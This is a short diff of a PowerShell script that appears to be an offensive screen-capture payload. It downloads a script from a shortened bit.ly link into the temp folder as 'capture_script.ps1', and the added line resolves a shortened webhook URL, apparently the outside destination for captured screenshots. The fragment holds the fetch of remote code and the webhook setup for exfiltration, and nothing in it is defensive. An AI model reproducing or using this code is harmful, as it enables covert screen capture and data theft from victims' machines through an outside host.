@@ -1,3 +1,5 @@
+if ($hookurl.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $hookurl = (irm $hookurl).url}
+
 $scriptUrl = "https://bit.ly/Screen_dc"
 $scriptPath = "$env:temp\capture_script.ps1"
 Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath
